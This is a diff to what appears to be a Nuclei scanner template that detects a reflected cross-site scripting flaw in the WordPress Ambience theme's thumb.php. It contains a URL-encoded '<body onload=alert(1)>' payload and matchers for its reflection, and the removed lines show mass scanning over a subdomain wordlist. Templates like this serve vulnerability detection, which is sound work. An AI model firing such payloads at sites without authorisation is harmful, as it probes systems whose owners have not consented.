@@ -1,31 +1,33 @@
 id: wp-ambience-xss
 
 info:
-  name: WordPress Theme Ambience - 'src' Reflected Cross-Site Scripting (XSS)
+  name: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
   author: daffainfo
   severity: medium
-  reference: https://www.exploit-db.com/exploits/38568
-  tags: wordpress,xss,wp-plugin
+  description: |
+    WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.
+  reference:
+    - https://www.exploit-db.com/expl oits/38568
+    - https://wpscan.com/vulnerability/c465e5c1-fe43-40e9-894a-97b8ac462381
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  tags: wp-plugin,wp,edb,wpscan,wordpress,xss
+  metadata:
+    max-request: 1
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
 
-    raw:
-      - |
-        GET /wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
           - "<body onload=alert(1)>"
-        part: body
 
       - type: word
         part: header
@@ -35,3 +37,5 @@ requests:
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/09/07
